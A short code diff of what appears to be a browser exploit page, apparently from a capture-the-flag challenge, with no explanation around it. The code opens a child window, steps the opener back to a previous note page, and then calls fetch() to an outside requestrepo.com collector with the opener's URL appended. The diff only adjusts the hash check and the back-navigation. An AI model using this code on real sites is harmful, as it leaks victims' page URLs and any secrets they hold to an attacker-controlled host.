@@ -9,13 +9,13 @@ if (window.location.hash == '#child') {
   sleep(1000).then(() => {
     fetch('https://ov4f10db.requestrepo.com/final?'+window.opener.location.href);
   });
-} else {
+} else if (window.location.hash == "") {
   // Open child window
   window.open('/#child');
 
   // Go back to previous note page
   sleep(500).then(() => {
-    window.history.go(-2);
+    window.history.back();
   });
 };
 
